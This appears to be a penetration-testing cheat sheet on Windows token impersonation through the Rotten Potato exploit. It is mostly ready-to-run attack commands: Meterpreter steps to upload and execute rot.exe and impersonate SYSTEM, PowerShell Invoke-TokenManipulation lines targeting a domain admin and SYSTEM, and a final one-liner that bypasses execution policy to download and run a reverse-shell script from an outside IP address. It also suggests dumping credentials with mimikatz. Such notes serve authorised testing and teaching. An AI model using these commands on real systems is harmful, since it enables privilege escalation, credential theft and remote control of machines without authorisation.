## Token Impersonation

Token impersonation using the rotten potato exploit is a privilege escalation technique that allows escalation from service level accounts to SYSTEM. This can be achieved through uploading an exe file exploit and executing or through memory injection with powershell. 

[https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

### Meterpreter
Get a meterpreter and upload rot.exe to the box
```
getuid
getprivs
use incognito
list\_tokens -u
cd c:\temp\
execute -Hc -f ./rot.exe
impersonate\_token "NT AUTHORITY\SYSTEM"
```

### Powershell

We can do token impersonation completely without Meterpreter, which is really nice. This trick spawns a new thread, but also works in the same thread. However, if you type whoami it might still show the original username, but you still have privs as your target user. If you do however spawn a new process (or a new shell) and migrate to that you will have a shell as the account you are impersonating.

Invokes token impersonation on a domain user. If this doesn't work you can try impersonating SYSTEM and then dropping credentials using mimikatz.

`Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"`

`Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"`

`Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"`

As a replacement for the last command you could do, but be vary of special characters in the command like `"` and `'`
`Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"`